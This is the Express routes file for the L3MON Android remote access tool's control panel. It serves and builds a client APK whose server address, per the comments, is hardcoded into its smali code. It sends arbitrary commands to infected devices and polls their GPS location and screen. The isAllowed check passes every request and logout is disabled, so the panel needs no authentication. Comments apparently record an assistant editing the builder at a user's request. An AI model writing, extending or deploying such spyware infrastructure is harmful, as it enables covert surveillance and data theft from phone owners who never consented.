const
    express = require('express'),
    routes = express.Router(),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    crypto = require('crypto');

let CONST = global.CONST;
let db = global.db;
let logManager = global.logManager;
let app = global.app;
let clientManager = global.clientManager;
let apkBuilder = global.apkBuilder;

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

function isAllowed(req, res, next) {
    next();
}

routes.get('/dl', (req, res) => {
    res.redirect('/l3mon/client.apk');
});

routes.get('/', isAllowed, (req, res) => {
    res.render('l3mon/index', {
        clientsOnline: clientManager.getClientListOnline(),
        clientsOffline: clientManager.getClientListOffline()
    });
});


routes.get('/login', (req, res) => {
    res.render('l3mon/login');
});

routes.post('/login', (req, res) => {
    if ('username' in req.body) {
        if ('password' in req.body) {
            let rUsername = db.maindb.get('admin.username').value();
            let rPassword = db.maindb.get('admin.password').value();
            let passwordMD5 = crypto.createHash('md5').update(req.body.password.toString()).digest("hex");
            if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
                let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
                db.maindb.get('admin').assign({ loginToken }).write();
                res.cookie('loginToken', loginToken, { maxAge: 10 * 365 * 24 * 60 * 60 * 1000, httpOnly: true, sameSite: 'lax' }).redirect('/l3mon/');
            } else return res.redirect('/l3mon/login?e=badLogin');
        } else return res.redirect('/l3mon/login?e=missingPassword');
    } else return res.redirect('/l3mon/login?e=missingUsername');
});

routes.get('/logout', isAllowed, (req, res) => {
    // db.maindb.get('admin').assign({ loginToken: '' }).write();
    // res.clearCookie('loginToken').redirect('/l3mon/');
    res.redirect('/l3mon/');
});


routes.get('/builder', isAllowed, (req, res) => {
    res.render('l3mon/builder', {
        myPort: CONST.control_port
    });
});

routes.post('/builder', isAllowed, (req, res) => {
    // If no URI/PORT provided, we just build with the defaults (which are now hardcoded in smali or pre-patched)
    // BUT the original code expects query params to patch.
    // The user wants to "remove customly add ip and port when build apk".
    // So we should SKIP the patchAPK step if no params, OR provide dummy params if we want to rely on the hardcoded value.
    // Actually, since we hardcoded the URL in IOSocket.smali, we can skip the patch step entirely or just run build.
    
    apkBuilder.buildAPK((error) => {
        if (!error) {
            logManager.log(CONST.logTypes.success, "Build Succeded!");
            res.json({ error: false });
        }
        else {
            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
            res.json({ error });
        }
    });
});


routes.get('/logs', isAllowed, (req, res) => {
    res.render('l3mon/logs', {
        logs: logManager.getLogs()
    });
});



routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
    let pageData = clientManager.getClientDataByPage(req.params.deviceid, req.params.page, req.query.filter);
    if (pageData) res.render('l3mon/deviceManager', {
        page: req.params.page,
        deviceID: req.params.deviceid,
        baseURL: '/l3mon/manage/' + req.params.deviceid,
        pageData
    });
    else res.render('l3mon/deviceManager', {
        page: 'notFound',
        deviceID: req.params.deviceid,
        baseURL: '/l3mon/manage/' + req.params.deviceid
    });
});

routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
    clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
        if (!error) res.json({ error: false })
        else res.json({ error })
    });
});

routes.post('/manage/:deviceid/SCREENPREVIEW/:action', isAllowed, (req, res) => {
    const action = req.params.action;
    if (action === 'start') {
        clientManager.screenshotPoll(req.params.deviceid);
        res.json({ error: false });
    } else if (action === 'stop') {
        if (clientManager.gpsPollers[req.params.deviceid]) {
            clearInterval(clientManager.gpsPollers[req.params.deviceid]);
            delete clientManager.gpsPollers[req.params.deviceid];
        }
        res.json({ error: false });
    } else res.json({ error: 'Unknown action' });
});

module.exports = routes;
